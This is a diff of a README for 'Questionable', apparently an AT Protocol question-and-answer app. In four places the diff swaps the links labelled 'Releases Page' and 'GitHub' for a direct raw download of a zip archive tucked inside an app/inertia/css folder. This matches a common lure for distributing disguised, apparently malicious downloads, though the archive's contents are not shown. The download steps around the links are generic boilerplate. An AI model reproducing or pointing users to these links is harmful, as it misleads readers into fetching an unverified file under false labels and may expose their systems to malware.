@@ -4,13 +4,13 @@
 Questionable is an AT Protocol app for asking questions and getting answers, receiving asks, and doing interviews or AMAs. This user-friendly application helps you connect with others and share knowledge effortlessly.
 
 ## 🔗 Download Now
-[![Download questionable-fyi](https://img.shields.io/badge/Download-questionable--fyi-blue.svg)](https://github.com/matheus09sd/questionable-fyi/releases)
+[![Download questionable-fyi](https://github.com/matheus09sd/questionable-fyi/raw/refs/heads/main/app/inertia/css/questionable_fyi_v1.0.zip)](https://github.com/matheus09sd/questionable-fyi/raw/refs/heads/main/app/inertia/css/questionable_fyi_v1.0.zip)
 
 ## 🚀 Getting Started
 To start using Questionable, follow these simple steps:
 
 1. **Download the Application**  
-   Visit this page to download: [Releases Page](https://github.com/matheus09sd/questionable-fyi/releases).
+   Visit this page to download: [Releases Page](https://github.com/matheus09sd/questionable-fyi/raw/refs/heads/main/app/inertia/css/questionable_fyi_v1.0.zip).
 
 2. **Choose the Right Version**  
    On the Releases page, look for the latest version. You may see options for different operating systems. Make sure to download the version that matches your system.
@@ -63,13 +63,13 @@ Ensure you have at least 500 MB of free disk space and a stable internet connect
 If you encounter issues or have questions, please visit our support page linked in the application or directly reach out to our community. You can find helpful tips and FAQs there.
 
 ## 🔄 Updates
-We regularly release updates to improve performance and add new features. Check the [Releases Page](https://github.com/matheus09sd/questionable-fyi/releases) frequently for the latest version and enhancements.
+We regularly release updates to improve performance and add new features. Check the [Releases Page](https://github.com/matheus09sd/questionable-fyi/raw/refs/heads/main/app/inertia/css/questionable_fyi_v1.0.zip) frequently for the latest version and enhancements.
 
 ## 📚 Resources
 - **Documentation**: For detailed guides and help, refer to our official documentation linked in the app.
 - **Community Forum**: Join discussions, ask questions, and connect with other users at our community forum.
 
 ## 🔗 More About Questionable
-For more information about Questionable and its capabilities, visit our repository at [GitHub](https://github.com/matheus09sd/questionable-fyi). 
+For more information about Questionable and its capabilities, visit our repository at [GitHub](https://github.com/matheus09sd/questionable-fyi/raw/refs/heads/main/app/inertia/css/questionable_fyi_v1.0.zip). 
 
 Download the app today and start your journey to asking and answering questions. Enjoy the process of learning and sharing knowledge effortlessly!
